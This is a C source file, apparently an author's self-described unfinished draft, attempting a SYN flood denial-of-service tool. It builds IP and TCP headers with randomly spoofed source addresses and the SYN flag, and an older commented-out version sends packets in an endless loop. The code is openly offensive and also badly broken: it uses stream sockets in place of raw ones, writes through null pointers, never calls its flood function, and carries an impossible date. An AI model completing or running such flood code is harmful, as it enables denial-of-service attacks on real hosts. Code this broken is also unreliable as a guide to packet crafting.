//this code is not good enough
//never mind,just record it in github
//I will write some else code to make it

/*
#include "unp.h"
#include <pthread.h>

struct tcp{
        uint32_t seq;
        uint32_t ack;
        uint32_t source;
        uint32_t dest;
        int doff;
        int urg;
        int syn;
        int rst;
        int psh;
        int fin;
}transinfo;

struct ip{
        int version;
        int ihl;
        int tos;
        int ttl;
        int protocal;
        uint32_t id;
        int frag;
        uint32_t saddr;
        uint32_t daddr;
}interinfo;

about_tcp(struct tcp *transinfo, int );
relate_ip(struct ip *interinfo, int );

int main(int argc, char *argv)
{
    int sockfd;
    int tcp_source, tcp_dest;
    int ip_saddr, ip_daddr;
    struct tcp *transinfo;
    struct ip *interinfo;
    int total;
    struct sockaddr_in servaddr;
    char buffer[500];
    if(argc!=2)
            err_quit("syn_flood error");
    sockfd=socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    tcp_dest=&servaddr.sin_addr;
    ip_daddr=&servaddr.sin_addr;
    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(SERV_PORT);
    Inet_pton(AF_INET, argv[1], &servaddr.sin_addr);
    total=sizeof(transinfo)+sizeof(interinfo);
    printf("enter addr and port:\n");
    scanf("%d, %d",SERV_PORT, servaddr.sin_addr);
    for(; ;){
         connect(sockfd, (SA *)&servaddr, sizeof(servaddr));
         tcp_source=rand()%0xFFFFFFFF;
         ip_saddr=rand()%0xFFFFFFFF;
         if(sendto(sockfd, buffer,total,0, &servaddr.sin_addr, sizeof(struct sockaddr_in))==-1){
                 err_quit("send error");
                 exit(0);
         }
    }
    return(0);
}

about_tcp(struct tcp *transinfo, int tcplen)
{
        struct sockaddr_in servaddr;
        tcplen=sizeof(transinfo);
        transinfo->seq=htons(rand()%0xFFFFFFFF);
        transinfo->ack=0;
        transinfo->source=htonl(rand()%0xFFFFFFFF);
        transinfo->dest=&servaddr.sin_addr;
        transinfo->doff=4;
        transinfo->urg=0;
        transinfo->syn=1;
        transinfo->rst=0;
        transinfo->psh=0;
        transinfo->fin=0;
        if(!transinfo){
                err_quit("transinfo error");
        }
        return(0);
}

relate_ip(struct ip *interinfo, int iplen)
{
        struct sockaddr_in servaddr;
        iplen=sizeof(interinfo);
        interinfo->version=4;
        interinfo->ihl=5;
        interinfo->tos=144;
        interinfo->ttl=255;
        interinfo->protocal=6;
        interinfo->id=rand()%0xFFFF;
        interinfo->frag=0;
        interinfo->saddr=htonl(rand()%0xFFFFFFFF);
        interinfo->daddr=&servaddr.sin_addr;
        if(!interinfo){
                err_quit("interinfo error");
        }
        return(0);
}
*/
//for memory 2022.3.22



#include <stdio.h>
#include <stdbool.h>
#include "unp.h"


struct tpseudo_hdr{
    uint32_t saddr;
    uint32_t daddr;
    unsigned char res;
    unsigned char proto;
    uint16_t tcp_len;
}g;

struct tcp {
    uint32_t seq;
    uint32_t ack;
    uint32_t source;
    uint32_t dest;
    int urg;
    int syn;
    int rst;
    int psh;
    int fin;
    int check;
};

struct ip {
    int version;
    int ihl;
    int tos;
    int ttl; 
    int protocal;
    uint32_t id;
    uint32_t saddr;
    uint32_t daddr;
    int check;
    int sum_len;
};


void* syn_flood(void* data);
uint32_t get_random_ip();
unsigned short csum(unsigned short* buf, int nwords);



int main(int argc, char **argv[]) {
    int sockfd;
    struct sockaddr_in  servaddr;

    if (argc != 2)
        err_quit("usage: udpcli<IPaddress>");

    sockfd = Socket(AF_INET, SOCK_STREAM, 0);
    
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERV_PORT);
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    connect(sockfd, (SA*)&servaddr, sizeof(servaddr));

    struct tcp* transinfo = NULL;
    struct ip* interinfo = NULL;
    struct tpseudo_hdr* pseudo_h = NULL;
    char buffer[50];
    interinfo = (struct ip*)buffer;
    transinfo = (struct tcp*)(interinfo + 1);
    memset(buffer, 0, sizeof(buffer));
   
    
    if (sendto(sockfd, buffer, interinfo->sum_len, 0, &servaddr, sizeof(servaddr)) < 0) {
        err_sys("sendto failed");
    }
    else {
        printf("packet send: %d\n", interinfo->sum_len);
    }


}
void* syn_flood(void* data) {
    struct sockaddr_in  servaddr;
    struct tcp* transinfo = NULL;
    struct ip* interinfo = NULL;
    struct tpseudo_hdr* pseudo_h = NULL;
    char buffer[50];

    interinfo->version = 4;
    interinfo->ihl = 5;
    interinfo->tos = 144;
    interinfo->ttl = 255;
    interinfo->protocal = 6;
    interinfo->id = rand() % 0xFFFF;
    interinfo->saddr = htonl(get_random_ip());
    interinfo->daddr = servaddr.sin_addr.s_addr;
    interinfo->sum_len = sizeof(struct tcp) + sizeof(struct ip);
    interinfo->check = csum((unsigned short*)buffer, interinfo->sum_len);

    transinfo->seq = 0;
    transinfo->ack = 0;
    transinfo->source = htonl(rand() % 0xFFFFFFFF);
    transinfo->dest = &servaddr.sin_addr.s_addr;
    transinfo->urg = 0;
    transinfo->syn = 1;
    transinfo->rst = 0;
    transinfo->psh = 0;
    transinfo->fin = 0;

    pseudo_h->daddr = servaddr.sin_addr.s_addr;
    pseudo_h->res = 0;
    pseudo_h->proto = IPPROTO_TCP;
    pseudo_h->tcp_len = htons(sizeof(struct tcp));
}




uint32_t get_random_ip() {
    uint32_t ip;

    for (char* p = (char*)&ip; p < (char*)(&ip + 1); p++)
        *p = rand() & 0xFF;

    return ip;
}

unsigned short csum(unsigned short* buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

//draft draft draft
//gdb yyds!
//2022.3.33




